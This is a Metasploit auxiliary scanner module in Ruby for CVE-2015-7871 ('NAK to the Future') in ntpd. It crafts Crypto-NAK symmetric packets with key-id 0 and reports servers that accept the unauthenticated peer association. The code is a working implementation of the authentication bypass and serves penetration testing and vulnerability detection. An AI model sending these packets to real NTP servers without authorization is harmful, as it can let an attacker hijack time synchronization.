##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::NTP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'NTP "NAK to the Future"',
        'Description'    => %q(
          Crypto-NAK packets can be used to cause ntpd to accept time from
          unauthenticated ephemeral symmetric peers by bypassing the
          authentication required to mobilize peer associations.  This module
          sends these Crypto-NAK packets in order to establish an association
          between the target ntpd instance and the attacking client.  The end goal
          is to cause ntpd to declare the legitimate peers "false tickers" and
          choose the attacking clients as the preferred peers, allowing
          these peers to control time.
         ),
        'Author'         =>
          [
            'Matthew Van Gundy of Cisco ASIG', # vulnerability discovery
            'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
          ],
        'License'        => MSF_LICENSE,
        'References'     =>
          [
            [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],
            [ 'URL', 'http://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],
            [ 'URL', 'http://support.ntp.org/bin/view/Main/NtpBug2941' ],
            [ 'CVE', '2015-7871' ]
          ]
      )
    )

    register_options(
      [
        OptInt.new('OFFSET', [true, "Offset from local time, in seconds", 300])
      ])

    deregister_options('RHOST')
  end

  def build_crypto_nak(time)
    probe = Rex::Proto::NTP::NTPSymmetric.new
    probe.stratum = 1
    probe.poll = 10
    probe.mode = 1
    unless time
      now = Time.now
      # compute the timestamp.  NTP stores a timestamp as 64-bit unsigned
      # integer, the high 32-bits representing the number of seconds since era
      # epoch and the low 32-bits representing the fraction of a second.  The era
      # epoch in this case is Jan 1 1900, so we must add the number of seconds
      # between then and the ruby era epoch, Jan 1 1970, which is 2208988800
      time = ((now.to_i + 2208988800 + datastore['OFFSET']) << 32) + now.nsec
    end

    # TODO: use different values for each?
    probe.reference_timestamp = time
    probe.origin_timestamp = time
    probe.receive_timestamp = time
    probe.transmit_timestamp = time
    # key-id 0
    probe.payload = "\x00\x00\x00\x00"
    probe
  end

  def check
    connect_udp

    # pick a random 64-bit timestamp
    canary_timestamp = rand((2**32)..((2**64) - 1))
    probe = build_crypto_nak(canary_timestamp)
    udp_sock.put(probe)

    expected_length = probe.to_binary_s.length - probe.payload.length
    response = udp_sock.timed_read(expected_length)
    disconnect_udp
    if response.length == expected_length
      ntp_symmetric = Rex::Proto::NTP::NTPSymmetric.new.read(response)
      if ntp_symmetric.mode == 2 && ntp_symmetric.origin_timestamp == canary_timestamp
        vprint_good("#{rhost}:#{rport} - NTP - VULNERABLE: Accepted a NTP symmetric active association")
        report_vuln(
          host: rhost,
          port: rport.to_i,
          proto: 'udp',
          sname: 'ntp',
          name: 'NTP "NAK to the Future"',
          info: 'Accepted an NTP symmetric active association by replying with a symmetric passive request',
          refs: references
        )
        return Exploit::CheckCode::Appears
      end
    end

    Exploit::CheckCode::Unknown
  end

  def run_host(_ip)
    check
  end
end
